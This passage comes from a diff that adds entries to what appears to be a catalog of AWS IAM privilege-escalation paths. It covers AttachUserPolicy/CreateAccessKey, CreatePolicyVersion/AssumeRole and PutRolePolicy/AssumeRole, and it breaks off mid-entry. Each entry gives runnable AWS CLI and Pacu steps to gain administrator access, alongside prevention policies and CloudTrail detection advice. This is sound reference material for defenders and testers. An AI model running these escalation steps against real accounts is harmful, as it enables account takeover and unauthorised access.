+    "description": "A principal with `iam:AttachUserPolicy` and `iam:CreateAccessKey` permissions on a target IAM user can achieve privilege escalation by attaching an administrative policy (such as the AWS-managed AdministratorAccess policy) to that user, creating new access keys for them, and then authenticating as that user with the newly created credentials. This is a lateral movement attack where the attacker modifies another principal's permissions and then assumes their identity. Even if the target user initially has minimal or no privileges, the combination of these two permissions creates a complete privilege escalation path to administrative access.",
+    "prerequisites": {
+      "admin": [
+        "A target IAM user must exist that the starting principal has permission to attach policies to",
+        "The target user must have fewer than 2 access keys (AWS enforces a limit of 2 access keys per IAM user)",
+        "The starting principal must have iam:AttachUserPolicy permission scoped to the target user",
+        "The starting principal must have iam:CreateAccessKey permission scoped to the target user"
+      ],
+      "lateral": [
+        "A target IAM user must exist that the starting principal has permission to attach policies to",
+        "The target user must have fewer than 2 access keys (AWS enforces a limit of 2 access keys per IAM user)",
+        "The starting principal must have iam:AttachUserPolicy permission scoped to the target user",
+        "The starting principal must have iam:CreateAccessKey permission scoped to the target user"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "# Set the target user name\nTARGET_USER=\"target-user-name\"\n",
+          "description": "Define the target user that will be modified and compromised"
+        },
+        {
+          "step": 2,
+          "command": "# List existing access keys for the target user\naws iam list-access-keys --user-name $TARGET_USER\n",
+          "description": "Verify that the target user has fewer than 2 access keys (AWS limit). If the user already has 2 keys, you must delete one first using iam:DeleteAccessKey permission."
+        },
+        {
+          "step": 3,
+          "command": "# Attach AdministratorAccess policy to the target user\naws iam attach-user-policy \\\n  --user-name $TARGET_USER \\\n  --policy-arn \"arn:aws:iam::aws:policy/AdministratorAccess\"\n",
+          "description": "Attach the AWS-managed AdministratorAccess policy to the target user"
+        },
+        {
+          "step": 4,
+          "command": "# Wait for IAM policy changes to propagate (15 seconds)\nsleep 15\n",
+          "description": "Wait for the policy attachment to propagate across AWS infrastructure"
+        },
+        {
+          "step": 5,
+          "command": "# Verify the policy was attached\naws iam list-attached-user-policies \\\n  --user-name $TARGET_USER \\\n  --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \\\n  --output table\n",
+          "description": "Verify that AdministratorAccess is now attached to the target user"
+        },
+        {
+          "step": 6,
+          "command": "# Create new access keys for the target user\nCREDENTIALS=$(aws iam create-access-key \\\n  --user-name $TARGET_USER \\\n  --output json)\n\n# Extract the credentials\nNEW_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKey.AccessKeyId')\nNEW_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.AccessKey.SecretAccessKey')\n\necho \"New Access Key ID: $NEW_ACCESS_KEY_ID\"\necho \"New Secret Access Key: $NEW_SECRET_ACCESS_KEY\"\n",
+          "description": "Create new access keys for the target user and extract the credentials"
+        },
+        {
+          "step": 7,
+          "command": "# Configure a new AWS CLI profile with the stolen credentials\naws configure set aws_access_key_id $NEW_ACCESS_KEY_ID --profile compromised-user\naws configure set aws_secret_access_key $NEW_SECRET_ACCESS_KEY --profile compromised-user\naws configure set region us-east-1 --profile compromised-user\n",
+          "description": "Configure a new AWS CLI profile using the newly created access keys"
+        },
+        {
+          "step": 8,
+          "command": "# Verify administrative access using the new credentials\naws iam list-users --max-items 5 --profile compromised-user\n",
+          "description": "Verify that you now have administrative access by listing IAM users with the compromised credentials"
+        }
+      ],
+      "pacu": [
+        {
+          "step": 1,
+          "command": "# Use Pacu to attach AdministratorAccess to the target user\nrun iam__attach_user_policy --user-name target-user-name --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n",
+          "description": "Use Pacu to attach the AdministratorAccess policy to the target user"
+        },
+        {
+          "step": 2,
+          "command": "# Use Pacu to create access keys for the target user\nrun iam__create_access_key --user-name target-user-name\n",
+          "description": "Use Pacu to create new access keys for the target user and save them for authentication"
+        },
+        {
+          "step": 3,
+          "command": "# Switch to the newly created credentials\nswap_keys\n",
+          "description": "Configure Pacu to use the newly created access keys for the target user"
+        }
+      ]
+    },
+    "limitations": "This attack requires that the starting principal has both permissions (iam:AttachUserPolicy AND iam:CreateAccessKey) scoped to the same target user. If these permissions are scoped to different users, the attack path is not viable.\n\nAdditionally, the target user must have fewer than 2 access keys due to AWS's hard limit. If the user already has 2 keys, the attacker would need an additional permission (iam:DeleteAccessKey) to remove an existing key before creating a new one.\n\nThe attack provides administrative access only if an admin policy (like AdministratorAccess) is attached to the user. However, the attacker could attach any AWS-managed or customer-managed policy they have visibility into, so the level of access depends on available policies.\n",
+    "recommendation": "Restrict `iam:AttachUserPolicy` and `iam:CreateAccessKey` using the principle of least privilege. These permissions should rarely be granted together on the same target user, as this combination creates a direct privilege escalation path.\n\n**Prevention strategies:**\n\n1. Use IAM policy conditions to restrict which policies can be attached:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:AttachUserPolicy\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:user/SpecificUser\",\n  \"Condition\": {\n    \"ArnNotEquals\": {\n      \"iam:PolicyARN\": [\n        \"arn:aws:iam::aws:policy/AdministratorAccess\",\n        \"arn:aws:iam::aws:policy/IAMFullAccess\"\n      ]\n    }\n  }\n}\n```\n\n2. Restrict `iam:CreateAccessKey` to prevent cross-user access key creation:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:CreateAccessKey\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:user/${aws:username}\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:UserName\": \"${aws:username}\"\n    }\n  }\n}\n```\n\n3. Implement Service Control Policies (SCPs) to prevent attachment of highly privileged managed policies\n\n4. Use IAM permissions boundaries to limit the maximum permissions a user can have, even if admin policies are attached\n\n5. Separate the permissions - avoid granting both `iam:AttachUserPolicy` and `iam:CreateAccessKey` to the same principal for other users\n\n6. Require MFA for sensitive policy attachment operations and access key creation\n\n**Detection strategies:**\n\nMonitor CloudTrail for the following event patterns:\n- `AttachUserPolicy` API calls where the calling principal differs from the target user, especially when administrative policies are attached\n- `CreateAccessKey` API calls where the calling principal differs from the target user\n- Sequential occurrences of `AttachUserPolicy` followed by `CreateAccessKey` on the same user within a short time window\n- Attachment of AWS-managed policies like `AdministratorAccess` or `IAMFullAccess` to users\n- Access key creation events that follow policy modification events\n\nSet up CloudWatch alarms for unexpected changes to user policies and creation of access keys by non-self principals. Investigate any modifications to user permissions combined with access key creation.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2018"
+    },
+    "references": [
+      {
+        "title": "AWS IAM Privilege Escalation \u2013 Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "AWS IAM Privilege Escalation Methods (GitHub Repository)",
+        "url": "https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation"
+      },
+      {
+        "title": "AWS IAM Privilege Escalation Techniques - Hacking The Cloud",
+        "url": "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
+      },
+      {
+        "title": "Investigating Privilege Escalation Methods in AWS (Bishop Fox)",
+        "url": "https://bishopfox.com/blog/privilege-escalation-in-aws"
+      },
+      {
+        "title": "IAM Vulnerable - AWS IAM Privilege Escalation Playground",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      }
+    ],
+    "relatedPaths": [
+      "iam-001",
+      "iam-002",
+      "iam-003",
+      "iam-014"
+    ],
+    "detectionRules": [
+      {
+        "platform": "CloudSIEM",
+        "ruleId": "TBD",
+        "url": "https://docs.datadoghq.com/security/default_rules/"
+      }
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true,
+      "pacu": true,
+      "prowler": true
+    },
+    "attackVisualization": {
+      "nodes": [
+        {
+          "id": "start",
+          "label": "starting-principal",
+          "type": "principal",
+          "description": "The principal initiating the attack. Can be an IAM user or role with both `iam:AttachUserPolicy` and `iam:CreateAccessKey` permissions on the target user.\n\nThis principal may have minimal or no administrative permissions initially, but the combination of these two permissions creates a complete privilege escalation path.\n"
+        },
+        {
+          "id": "target_user",
+          "label": "target-user",
+          "type": "resource",
+          "description": "The IAM user being modified and compromised. Must be a valid IAM user with fewer than 2 existing access keys.\n\nInitially, this user may have minimal or no privileges. The attacker will attach the AdministratorAccess policy to it and create new access keys for authentication.\n"
+        },
+        {
+          "id": "admin",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "description": "Full administrative access to the AWS account. The attacker achieves this by:\n1. Attaching AdministratorAccess policy to the target user\n2. Creating new access keys for the target user\n3. Authenticating with those credentials to perform administrative actions\n\nThis is a deterministic outcome since the attacker controls which policy to attach to the user.\n"
+        }
+      ],
+      "edges": [
+        {
+          "from": "start",
+          "to": "target_user",
+          "label": "iam:AttachUserPolicy (AdministratorAccess)",
+          "description": "The attacker uses `iam:AttachUserPolicy` to attach the AWS-managed AdministratorAccess policy to the target user.\n\nCommand:\n```bash\naws iam attach-user-policy \\\n  --user-name target-user-name \\\n  --policy-arn \"arn:aws:iam::aws:policy/AdministratorAccess\"\n```\n\nAfter this action, the target user has administrative permissions. The attacker must wait approximately 15 seconds for the IAM policy changes to propagate across AWS infrastructure.\n"
+        },
+        {
+          "from": "target_user",
+          "to": "admin",
+          "label": "iam:CreateAccessKey + Authenticate",
+          "description": "The attacker uses `iam:CreateAccessKey` to create new access keys for the now-privileged target user, then authenticates using those credentials.\n\nCommands:\n```bash\n# Create access keys\nCREDENTIALS=$(aws iam create-access-key \\\n  --user-name target-user-name \\\n  --output json)\n\nNEW_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKey.AccessKeyId')\nNEW_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.AccessKey.SecretAccessKey')\n\n# Configure profile with new credentials\naws configure set aws_access_key_id $NEW_ACCESS_KEY_ID --profile compromised\naws configure set aws_secret_access_key $NEW_SECRET_ACCESS_KEY --profile compromised\n\n# Use the compromised credentials\naws iam list-users --profile compromised\n```\n\nThese new access keys have full administrative permissions and can be used to perform any action in the AWS account. Unlike temporary credentials from AssumeRole, these access keys do not expire and remain valid until explicitly deactivated or deleted.\n"
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": null,
+      "lastUpdated": null,
+      "contributors": []
+    },
+    "filePath": "data/paths/iam/iam-015.yaml"
+  },
+  {
+    "id": "iam-016",
+    "name": "iam:CreatePolicyVersion + sts:AssumeRole",
+    "category": "lateral-movement",
+    "services": [
+      "iam",
+      "sts"
+    ],
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:CreatePolicyVersion",
+          "resourceConstraints": "Customer-managed policy ARN must be in the Resource section and the policy must be attached to a role that the attacker can assume"
+        },
+        {
+          "permission": "sts:AssumeRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section and the role's trust policy must allow the principal to assume it"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:GetPolicy",
+          "resourceConstraints": "Helpful for getting policy ARN and current version information"
+        },
+        {
+          "permission": "iam:GetPolicyVersion",
+          "resourceConstraints": "Useful for viewing current policy document and version details"
+        },
+        {
+          "permission": "iam:ListPolicyVersions",
+          "resourceConstraints": "Helpful for listing all policy versions to verify new version creation"
+        },
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Useful for discovering roles that have the target policy attached"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Helpful for viewing role details, attached policies, and trust policies"
+        }
+      ]
+    },
+    "description": "A principal with `iam:CreatePolicyVersion` on a customer-managed policy attached to a role and `sts:AssumeRole` on that role can create a new policy version with administrative permissions, then assume the role to gain those elevated privileges. This path exploits AWS's policy versioning feature where new versions can be set as default and take effect immediately, combined with lateral movement through role assumption.",
+    "prerequisites": {
+      "admin": [
+        "A customer-managed policy must exist that is attached to a target role",
+        "The target role's trust policy must allow the attacker's principal to assume it",
+        "The target role must have administrative permissions after policy modification"
+      ],
+      "lateral": [
+        "A customer-managed policy must exist that is attached to a target role",
+        "The target role's trust policy must allow the attacker's principal to assume it"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws sts get-caller-identity",
+          "description": "Verify current identity before privilege escalation"
+        },
+        {
+          "step": 2,
+          "command": "aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table",
+          "description": "List available roles to find targets with the customer-managed policy attached (optional but helpful for discovery)"
+        },
+        {
+          "step": 3,
+          "command": "aws iam get-policy --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY",
+          "description": "Get the target customer-managed policy information to verify it exists and check current version"
+        },
+        {
+          "step": 4,
+          "command": "aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY --version-id v1",
+          "description": "View the current policy document to understand existing permissions (optional)"
+        },
+        {
+          "step": 5,
+          "command": "aws iam create-policy-version \\\n  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY \\\n  --policy-document file://admin_policy.json \\\n  --set-as-default\n",
+          "description": "Create a new policy version with administrative permissions and set it as default. The policy immediately takes effect for all principals that have it attached."
+        },
+        {
+          "step": 6,
+          "command": "sleep 15",
+          "description": "Wait briefly for the policy changes to propagate across AWS (typically takes a few seconds)"
+        },
+        {
+          "step": 7,
+          "command": "aws iam list-policy-versions --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY",
+          "description": "Verify the new policy version was created and is set as default (optional)"
+        },
+        {
+          "step": 8,
+          "command": "aws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE \\\n  --role-session-name privesc-session\n",
+          "description": "Assume the target role to obtain temporary credentials with the newly elevated permissions"
+        },
+        {
+          "step": 9,
+          "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 8>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 8>\nexport AWS_SESSION_TOKEN=<SessionToken from step 8>\n",
+          "description": "Configure the AWS CLI to use the assumed role credentials"
+        },
+        {
+          "step": 10,
+          "command": "aws sts get-caller-identity",
+          "description": "Verify the assumed role identity"
+        },
+        {
+          "step": 11,
+          "command": "aws iam list-users --max-items 3",
+          "description": "Verify administrative access was successfully obtained"
+        }
+      ],
+      "pacu": [
+        {
+          "step": 1,
+          "command": "run iam__enum_permissions",
+          "description": "Enumerate IAM permissions and identify roles with customer-managed policies attached"
+        },
+        {
+          "step": 2,
+          "command": "run iam__privesc_scan",
+          "description": "Scan for IAM privilege escalation opportunities including CreatePolicyVersion + AssumeRole combinations"
+        },
+        {
+          "step": 3,
+          "command": "run iam__create_policy_version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY --policy-file admin_policy.json",
+          "description": "Use Pacu to create a new policy version with admin permissions"
+        },
+        {
+          "step": 4,
+          "command": "run iam__assume_role --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE",
+          "description": "Assume the privileged role using Pacu"
+        }
+      ]
+    },
+    "limitations": "This path provides administrative access only if the new policy version includes administrative permissions (e.g., AdministratorAccess equivalent). The attacker gains whatever permissions are specified in the new policy version they create. However, even limited additional permissions may enable multi-hop attacks or data access.\n",
+    "recommendation": "This attack path requires multiple controls to prevent effectively:\n\n**1. Restrict `iam:CreatePolicyVersion` permission:**\n- Very few principals need this permission. Restrict it to only authorized IAM administrators.\n- Use resource-level restrictions to limit which policies can be modified:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:CreatePolicyVersion\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:policy/AllowedPolicy*\"\n}\n```\n\n**2. Restrict `sts:AssumeRole` permission:**\n- Carefully audit IAM role trust policies to ensure they follow the principle of least privilege.\n- Only allow trusted principals to assume sensitive roles.\n- Consider requiring MFA for sensitive role assumptions:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Principal\": {\"AWS\": \"arn:aws:iam::ACCOUNT_ID:user/TrustedUser\"},\n  \"Action\": \"sts:AssumeRole\",\n  \"Condition\": {\"Bool\": {\"aws:MultiFactorAuthPresent\": \"true\"}}\n}\n```\n\n**3. Monitoring and Detection:**\n- Alert on `CreatePolicyVersion` events in CloudTrail, especially with `--set-as-default` flag\n- Monitor for `AssumeRole` events on privileged roles, especially shortly after policy version changes\n- Use AWS Config rules to detect roles with administrative permissions that can be assumed by users\n- Implement anomaly detection for unusual assume-role patterns or assumptions from unexpected IP addresses\n\n**4. Additional Controls:**\n- Use IAM Access Analyzer to regularly audit role trust policies for overly permissive trust relationships\n- Implement service control policies (SCPs) to restrict policy version creation at the organizational level\n- Consider using permission boundaries to limit the maximum permissions that can be granted through policy modifications\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS IAM Privilege Escalation Methods",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "AWS IAM Privilege Escalation Techniques - Hacking the Cloud",
+        "url": "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
+      },
+      {
+        "title": "Investigating Privilege Escalation Methods in AWS",
+        "url": "https://bishopfox.com/blog/privilege-escalation-in-aws"
+      }
+    ],
+    "relatedPaths": [
+      "iam-001",
+      "iam-007",
+      "iam-008",
+      "sts-001"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true,
+      "pacu": true
+    },
+    "attackVisualization": {
+      "nodes": [
+        {
+          "id": "start",
+          "label": "starting-principal",
+          "type": "principal",
+          "description": "The principal initiating the attack. Can be an IAM user or role with both `iam:CreatePolicyVersion` permission on a customer-managed policy and `sts:AssumeRole` permission on a target role. The customer-managed policy must be attached to the target role that the principal can assume.\n"
+        },
+        {
+          "id": "customer_policy",
+          "label": "customer-managed-policy",
+          "type": "resource",
+          "description": "A customer-managed IAM policy that is attached to the target role. The starting principal has `iam:CreatePolicyVersion` permission for this specific policy ARN, allowing them to create new versions with elevated permissions. This policy acts as the pivot point for the attack - by modifying it, the attacker can elevate the permissions of any principal that has it attached.\n"
+        },
+        {
+          "id": "target_role",
+          "label": "target-role",
+          "type": "resource",
+          "description": "An IAM role that has the customer-managed policy attached to it. The starting principal has `sts:AssumeRole` permission for this role. Once the attacker modifies the customer-managed policy to grant administrative permissions, this role inherits those elevated privileges. The role must have a trust policy that allows the starting principal to assume it.\n"
+        },
+        {
+          "id": "admin",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "description": "Full administrative access to the AWS account. The attacker achieves this by first creating a new version of the customer-managed policy with administrative permissions (setting it as the default), then using `sts:AssumeRole` to assume the target role which now has those elevated privileges. The assumed role credentials provide full administrative access to the AWS environment.\n"
+        }
+      ],
+      "edges": [
+        {
+          "from": "start",
+          "to": "customer_policy",
+          "label": "iam:CreatePolicyVersion",
+          "description": "The attacker uses `iam:CreatePolicyVersion` to create a new version of the customer-managed policy with administrative permissions and sets it as the default version.\n\nCommand:\n```bash\naws iam create-policy-version \\\n  --policy-arn \"arn:aws:iam::ACCOUNT_ID:policy/customer-policy-name\" \\\n  --policy-document file://admin_policy.json \\\n  --set-as-default\n```\n\nWhere admin_policy.json contains a policy document granting full administrative access. The `--set-as-default` flag makes this new version active immediately, so any principal with this policy attached (including the target role) instantly gains these elevated permissions.\n"
+        },
+        {
+          "from": "customer_policy",
+          "to": "target_role",
+          "label": "Policy attached to role",
+          "description": "The customer-managed policy is attached to the target role. This is a prerequisite condition that must exist for the attack to work. When the policy is modified to include administrative permissions, the target role automatically inherits those new permissions. The attacker needs to identify this relationship beforehand, typically using `iam:ListEntitiesForPolicy` or `iam:ListAttachedRolePolicies` permissions.\n"
+        },
+        {
+          "from": "target_role",
+          "to": "admin",
+          "label": "sts:AssumeRole",
+          "description": "The attacker uses `sts:AssumeRole` to assume the target role, which now has administrative permissions via the modified customer-managed policy.\n\nCommand:\n```bash\naws sts assume-role \\\n  --role-arn \"arn:aws:iam::ACCOUNT_ID:role/target-role-name\" \\\n  --role-session-name \"privesc-session\"\n```\n\nThe API returns temporary security credentials (AccessKeyId, SecretAccessKey, SessionToken) that have full administrative access. Configure these credentials in the AWS CLI or SDK to perform administrative actions:\n\n```bash\nexport AWS_ACCESS_KEY_ID=<AccessKeyId>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey>\nexport AWS_SESSION_TOKEN=<SessionToken>\n\n# Verify administrative access\naws iam list-users\n```\n"
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": null,
+      "lastUpdated": null,
+      "contributors": []
+    },
+    "filePath": "data/paths/iam/iam-016.yaml"
+  },
+  {
+    "id": "iam-017",
+    "name": "iam:PutRolePolicy + sts:AssumeRole",
+    "category": "lateral-movement",
+    "services": [
+      "iam",
+      "sts"
+    ],
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PutRolePolicy",
+          "resourceConstraints": "Must have permission on the target role ARN"
+        },
+        {
+          "permission": "sts:AssumeRole",
+          "resourceConstraints": "Must have permission to assume the target role, and the role must trust the attacking principal"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering available roles that can be modified and assumed"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies to identify assumable roles"
+        },
+        {
+          "permission": "iam:ListRolePolicies",
+          "resourceConstraints": "Helpful for viewing current inline policies on the target role"
+        },
+        {
+          "permission": "iam:GetRolePolicy",
+          "resourceConstraints": "Useful for viewing inline policy details before and after modification"
+        }
+      ]
+    },
+    "description": "A principal with `iam:PutRolePolicy` and `sts:AssumeRole` can attach an inline policy with elevated permissions directly to a role they can assume, then assume that role to gain those elevated privileges. Inline policies are embedded directly in IAM roles and are often overlooked during security reviews because they are not visible as standalone policy objects in the IAM console's policies list. This technique allows an attacker to modify a role's permissions without creating or attaching managed policies, making the privilege escalation less visible.",
+    "prerequisites": {
+      "admin": [
+        "A target role must exist with a trust policy that allows the attacking principal to assume it",
+        "The attacking principal must have `iam:PutRolePolicy` permission on the target role",
+        "The attacking principal must have `sts:AssumeRole` permission on the target role"
+      ],
+      "lateral": [
+        "A target role must exist with a trust policy that allows the attacking principal to assume it",
+        "The attacking principal must have `iam:PutRolePolicy` permission on the target role",
+        "The attacking principal must have `sts:AssumeRole` permission on the target role"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table",
+          "description": "List all roles to identify targets with trust policies that allow the attacking principal to assume them"
+        },
+        {
+          "step": 2,
+          "command": "aws iam get-role --role-name TARGET_ROLE",
+          "description": "Check the trust policy of a specific role to verify the attacking principal can assume it"
+        },
+        {
+          "step": 3,
+          "command": "aws iam list-role-policies --role-name TARGET_ROLE",
+          "description": "List current inline policies on the target role to verify existing permissions (optional)"
+        },
+        {
+          "step": 4,
+          "command": "aws iam put-role-policy \\\n  --role-name TARGET_ROLE \\\n  --policy-name AdminInlinePolicy \\\n  --policy-document '{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n      {\n        \"Effect\": \"Allow\",\n        \"Action\": \"*\",\n        \"Resource\": \"*\"\n      }\n    ]\n  }'\n",
+          "description": "Create an inline policy with administrative permissions and attach it directly to the target role"
+        },
+        {
+          "step": 5,
+          "command": "sleep 15",
+          "description": "Wait for the policy to propagate across AWS infrastructure (typically takes 10-15 seconds)"
+        },
+        {
+          "step": 6,
+          "command": "aws iam list-role-policies --role-name TARGET_ROLE",
+          "description": "Verify the inline policy was successfully attached to the target role (optional)"
+        },
+        {
+          "step": 7,
+          "command": "aws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE \\\n  --role-session-name privesc-session\n",
+          "description": "Assume the target role to gain the elevated permissions from the inline policy"
+        },
+        {
+          "step": 8,
+          "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 7>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 7>\nexport AWS_SESSION_TOKEN=<SessionToken from step 7>\n",
+          "description": "Configure the AWS CLI to use the assumed role credentials"
+        },
+        {
+          "step": 9,
+          "command": "aws sts get-caller-identity",
+          "description": "Verify the assumed role identity"
+        },
+        {
+          "step": 10,
+          "command": "aws iam list-users --max-items 3",
+          "description": "Verify administrative access by testing a privileged operation"
+        }
+      ],
+      "pacu": [
+        {
+          "step": 1,
+          "command": "run iam__enum_permissions",
+          "description": "Enumerate IAM permissions and identify roles that can be modified and assumed"
+        },
+        {
+          "step": 2,
+          "command": "run iam__privesc_scan",
+          "description": "Scan for IAM privilege escalation opportunities including PutRolePolicy + AssumeRole combinations"
+        },
+        {
+          "step": 3,
+          "command": "run iam__put_role_policy --role-name TARGET_ROLE --policy-name AdminInlinePolicy --policy-file admin_policy.json",
+          "description": "Use Pacu to add an inline policy with admin permissions to the target role"
+        },
+        {
+          "step": 4,
+          "command": "run iam__assume_role --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE",
+          "description": "Assume the privileged role using Pacu"
+        }
+      ]
+    },
+    "limitations": "The target role's trust policy must explicitly allow the attacking principal (or a principal they can access) to assume it. Some organizations may have SCPs that deny inline policy modifications on certain roles. The attacking principal needs both `iam:PutRolePolicy` and `sts:AssumeRole` permissions on the same target role for this path to work. Policy changes may take a few seconds to propagate before they become effective. If the role has a permission boundary, the inline policy will be constrained by that boundary.\n",
+    "recommendation": "To prevent this privilege escalation path:\n\n**1. Restrict inline policy management permissions:**\nLimit `iam:PutRolePolicy`, `iam:PutUserPolicy`, and `iam:PutGroupPolicy` to only trusted administrators. These permissions allow direct modification of principal permissions without the visibility of managed policies.\n\n**2. Implement least privilege for role assumption:**\nOnly grant `sts:AssumeRole` permission to principals that have a legitimate business need to assume specific roles. Use resource-level restrictions to limit which roles can be assumed:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"sts:AssumeRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificAllowedRole\"\n}\n```\n\n**3. Use SCPs to prevent inline policy creation:**\nDeploy Service Control Policies (SCPs) that deny `iam:Put*Policy` actions for sensitive roles, even if IAM permissions allow it:\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Deny\",\n      \"Action\": [\n        \"iam:PutRolePolicy\",\n        \"iam:PutUserPolicy\",\n        \"iam:PutGroupPolicy\"\n      ],\n      \"Resource\": [\n        \"arn:aws:iam::*:role/SensitiveRole*\",\n        \"arn:aws:iam::*:user/PrivilegedUser*\"\n      ]\n    }\n  ]\n}\n```\n\n**4. Monitor inline policy changes:**\nConfigure AWS CloudTrail alerts for `PutRolePolicy`, `PutUserPolicy`, and `PutGroupPolicy` API calls. These are high-risk actions that should be rare and closely monitored.\n\n**5. Prefer managed policies over inline policies:**\nManaged policies are more visible in security reviews and easier to audit. Consider blocking inline policy creation entirely for production environments.\n\n**6. Implement permission boundaries:**\nUse IAM permission boundaries on roles to set the maximum permissions that can be granted, even through inline policies.\n\n**7. Regular audits:**\nPeriodically audit all roles for inline policies, especially those with sensitive trust policies. Inline policies are less visible than managed policies and may be overlooked.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2018"
+    },
+    "references": [
+      {
+        "title": "AWS IAM Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "AWS-IAM-Privilege-Escalation - Method 12: Creating/updating an inline policy for a role",
+        "url": "https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation"
+      },
+      {
+        "title": "IAM Vulnerable - Privesc12 (IAM-PutRolePolicy)",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      },
+      {
+        "title": "AWS IAM Privilege Escalation Techniques - Hacking the Cloud",
+        "url": "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
+      },
+      {
+        "title": "Investigating Privilege Escalation Methods in AWS",
+        "url": "https://bishopfox.com/blog/privilege-escalation-in-aws"
+      }
+    ],
+    "relatedPaths": [
+      "iam-001",
+      "iam-005",
+      "iam-007",
+      "iam-012",
+      "iam-014",
+      "iam-016"
+    ],
+    "detectionRules": [
+      {
+        "platform": "CloudTrail",
+        "ruleId": "PutRolePolicy-Monitoring",
+        "url": "https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference.html"
+      }
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true,
+      "pacu": true,
+      "prowler": false
+    },
+    "attackVisualization": {
+      "nodes": [
+        {
+          "id": "start",
+          "label": "starting-principal",
+          "type": "principal",
+          "description": "The principal initiating the attack. Can be an IAM user or role with both `iam:PutRolePolicy` permission on a target role and `sts:AssumeRole` permission on that same role. The attacker uses these permissions to add an inline policy with administrative permissions to the target role, then assumes it to gain elevated privileges.\n"
+        },
+        {
+          "id": "target_role",
+          "label": "target-role",
+          "type": "resource",
+          "description": "An IAM role that the starting principal can modify with inline policies and assume. The role must have a trust policy that allows the starting principal to assume it. The attacker adds an inline policy with administrative permissions directly to this role using `iam:PutRolePolicy`, which embeds the policy document within the role itself (unlike customer-managed policies which are separate resources).\n"
+        },
+        {
+          "id": "admin",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "description": "Full administrative access to the AWS account. The attacker achieves this by first using `iam:PutRolePolicy` to add an inline policy with administrative permissions to the target role, then using `sts:AssumeRole` to assume that role and gain the elevated privileges. The assumed role credentials provide full administrative access to the AWS environment.\n"
+        }
+      ],
+      "edges": [
+        {
